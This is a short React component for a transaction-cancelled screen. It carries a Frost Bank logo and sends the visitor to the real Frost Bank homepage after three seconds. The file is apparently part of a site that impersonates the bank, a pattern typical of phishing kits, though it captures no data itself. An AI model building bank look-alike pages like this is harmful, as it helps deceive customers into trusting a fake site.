import React from 'react'
import { useNavigate } from 'react-router-dom'
const Cancel = () => {
    const navigate = useNavigate
    setTimeout(() => {
        window.location.href = "https://www.frostbank.com/"
    }, 3000);
  return (
    <>
    <div class="pt-5">
            <div class="mx-auto col-lg-6 col-md-10 col-12 bg-white card pt-3 rounded-2 pt-4">
                <div class="text-center  pb-3">
                    <img src="/images/frost_logo.png" width="200" alt=""/>
                </div>
                <hr />
                <div class="text-center pt-2 pb-3">
                    <img src="/images/done.svg" alt=""/>
                </div>
                <div class="text-center pb-5">
                    <h5 class="text-center">Your transaction has been successfully cancelled.</h5>
                    <p><small>You are being redirected to the Homepage...........</small></p>
                </div>
            </div>
        </div>
    </>
  )
}

export default Cancel